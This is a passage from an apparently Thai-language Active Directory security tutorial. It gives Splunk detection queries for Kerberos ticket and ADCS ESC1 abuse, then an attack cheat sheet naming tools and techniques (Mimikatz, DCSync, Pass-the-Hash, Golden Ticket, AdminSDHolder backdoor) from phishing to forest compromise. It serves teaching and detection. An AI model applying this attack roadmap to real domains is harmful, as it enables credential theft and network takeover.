index=wineventlog EventCode=4768 
| join Account_Name [
    search index=wineventlog EventCode=4769
    | table Account_Name, Service_Name, Ticket_Encryption_Type
  ]
| where NOT Account_Name like "%$"
| stats count by Account_Name, Service_Name
        ''',
        'response': 'Reset KRBTGT password twice (24hr apart)'
    },
    {
        'attack': 'ADCS ESC1',
        'mitre_id': 'T1649',
        'detection_rule': '''
EventCode=4887 (Certificate Issued)
With Subject Alternative Name for different user
Requested by non-admin
        ''',
        'splunk_query': '''
index=wineventlog EventCode=4887 
| where match(Request_Attributes, "SAN") 
| table _time, Requester, Subject, Request_Attributes, Template_Name
        ''',
        'response': 'Audit certificate templates, revoke suspect certs'
    }
]

for scenario in PURPLE_TEAM_SCENARIOS:
    print(f"\n{'='*60}")
    print(f"Attack: {scenario['attack']} ({scenario.get('mitre_id', 'N/A')})")
    print(f"Detection:\n{scenario['detection_rule']}")
    print(f"Splunk Query:\n{scenario['splunk_query']}")
    print(f"Response: {scenario.get('response', 'Investigate')}")
```

### AD Attack Path Summary

```
=== AD Attack Cheat Sheet ===

Initial Compromise:
  phishing -> payload -> user shell

Local Privilege Escalation:
  PrintSpoofer, GodPotato, RoguePotato
  Token impersonation

Domain Reconnaissance:
  BloodHound, PowerView, ldapdomaindump

Credential Access:
  Mimikatz, CrackMapExec, secretsdump
  Kerberoasting, AS-REP Roasting

Lateral Movement:
  Pass-the-Hash (NTLM)
  Pass-the-Ticket (Kerberos)
  wmiexec, psexec, evil-winrm

Domain Escalation:
  ACL abuse (GenericAll, WriteDACL)
  RBCD attack
  ADCS ESC1-8
  Child-to-Parent (Extra SID)

Domain Compromise:
  DCSync (dump all hashes)
  Golden/Silver/Diamond Ticket
  AdminSDHolder backdoor

Forest Compromise:
  Forest trust attacks
  Golden SAML
  Azure AD Connect (AADSync)
```

---

## สรุป

| เทคนิค | ต้องการ | ผลลัพธ์ |
|--------|---------|----------|
| Kerberoasting | Valid user creds | Service account hash |
| AS-REP Roast | Usernames list | User hash (no pre-auth) |
| DCSync | Replicate perms | All NTLM hashes |
| Golden Ticket | KRBTGT hash | Unlimited domain access |
| Silver Ticket | Service hash | Service-specific access |
| RBCD | GenericWrite on computer | Admin access to computer |
| ADCS ESC1 | Enroll permission | Admin certificate |
| Shadow Credentials | GenericWrite on computer | Computer account auth |
| Child-to-Parent | Child DA + KRBTGT hash | Enterprise Admin |
| BloodHound | Domain read access | Attack path visualization |

---

← [Part 72: Container Security](Part-72-Container-Security.md) | [Part 74: Red Team Operations](Part-74-Red-Team-Operations.md) →
